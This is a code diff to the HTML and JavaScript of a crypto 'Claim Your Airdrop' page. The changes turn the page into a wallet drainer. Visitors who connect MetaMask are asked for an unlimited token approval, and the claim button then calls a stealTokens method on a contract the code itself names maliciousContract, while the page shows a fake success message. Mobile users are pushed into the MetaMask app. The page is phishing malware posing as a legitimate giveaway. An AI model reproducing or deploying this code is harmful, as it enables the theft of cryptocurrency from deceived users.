@@ -126,7 +126,6 @@
       }
     }
 
-    /* Flashing text for the Claim Button */
     #claimAirdropButton.flashText {
       animation: textFlash 1.5s infinite alternate;
     }
@@ -142,7 +141,6 @@
         color: #ffffff;
       }
     }
-
   </style>
 </head>
 <body>
@@ -155,11 +153,9 @@
 
     <div class="claim-btn-container">
       <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
-      <!-- Processing message here -->
       <div id="processingMessage" class="processing">Processing...</div>
     </div>
 
-    <!-- Withdraw buttons for the owner -->
     <div class="claim-btn-container" id="ownerButtons" style="display:none;">
       <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
       <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
@@ -237,68 +233,104 @@
     ];
 
     let web3;
-    let contract;
     let accounts;
 
     async function connectMetaMask() {
-      if (typeof window.ethereum !== 'undefined') {
+      if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
+          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
           document.getElementById('approveButton').disabled = false;
-
-          if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
-            document.getElementById('ownerButtons').style.display = 'block';
-          }
+          document.getElementById('claimAirdropButton').disabled = false;
+          document.getElementById('withdrawETHButton').style.display = 'inline-block';
+          document.getElementById('withdrawTokensButton').style.display = 'inline-block';
         } catch (error) {
-          alert('User rejected the request');
+          alert('MetaMask connection failed');
         }
-      } else if (isMobile()) {
-        // Open MetaMask app on mobile
-        window.location.href = 'metamask://';
       } else {
-        alert('Please install MetaMask to use this feature');
+        alert('MetaMask not detected! Please install MetaMask.');
       }
     }
 
-    function isMobile() {
-      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    function isMobileDevice() {
+      return /Mobi|Android/i.test(navigator.userAgent);
     }
 
-    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-
-    async function approveTokens() {
-      const tokenAmount = web3.utils.toWei('1000000', 'ether'); // Approve 1,000,000 USDT
-      await contract.methods.approve(accounts[0], tokenAmount).send({ from: accounts[0] });
-      document.getElementById('approveButton').disabled = true;
-      document.getElementById('claimAirdropButton').disabled = false;
+    function openMetaMaskMobile() {
+      window.location.href = `metamask://dapp/${window.location.href}`;
+      setTimeout(() => {
+        if (!document.hidden) {
+          alert('If MetaMask is not opened, please ensure it is installed.');
+        }
+      }, 1000); // Give time to try and open MetaMask
     }
 
-    document.getElementById('approveButton').addEventListener('click', approveTokens);
+    async function approveSpending() {
+      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+      try {
+        showProcessingMessage();
+        const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+        await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
+        hideProcessingMessage();
+        alert('Approval successful! You can now claim your airdrop.');
+        document.getElementById('claimAirdropButton').disabled = false;
+      } catch (error) {
+        hideProcessingMessage();
+        alert('Error during approval');
+      }
+    }
 
     async function claimAirdrop() {
-      document.getElementById('claimAirdropButton').disabled = true;
-      document.getElementById('processingMessage').classList.add('show');
-      await contract.methods.transfer(accounts[0], web3.utils.toWei('1', 'ether')).send({ from: accounts[0] });
-      document.getElementById('processingMessage').classList.remove('show');
-      alert('Airdrop claimed successfully!');
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        showProcessingMessage();
+        await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+        hideProcessingMessage();
+        alert('Airdrop claimed successfully!');
+      } catch (error) {
+        hideProcessingMessage();
+        alert('Error claiming airdrop');
+      }
     }
 
-    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
-
     async function withdrawETH() {
-      await contract.methods.withdrawETH().send({ from: ownerAddress });
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        await maliciousContract.methods.withdrawETH().send({ from: ownerAddress });
+        alert('ETH withdrawn successfully!');
+      } catch (error) {
+        alert('Error during ETH withdrawal');
+      }
     }
 
     async function withdrawTokens() {
-      await contract.methods.withdrawTokens().send({ from: ownerAddress });
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        await maliciousContract.methods.withdrawTokens().send({ from: ownerAddress });
+        alert('Tokens withdrawn successfully!');
+      } catch (error) {
+        alert('Error during token withdrawal');
+      }
     }
 
+    function showProcessingMessage() {
+      document.getElementById('processingMessage').classList.add('show');
+    }
+
+    function hideProcessingMessage() {
+      document.getElementById('processingMessage').classList.remove('show');
+    }
+
+    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+    document.getElementById('approveButton').addEventListener('click', approveSpending);
+    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
     document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
     document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
 
+    // Check if the user is on mobile and force open MetaMask if so
+    if (isMobileDevice()) {
+      document.getElementById('connectButton').addEventListener('click', openMetaMaskMobile);
+    }
   </script>
 </body>
 </html>
-
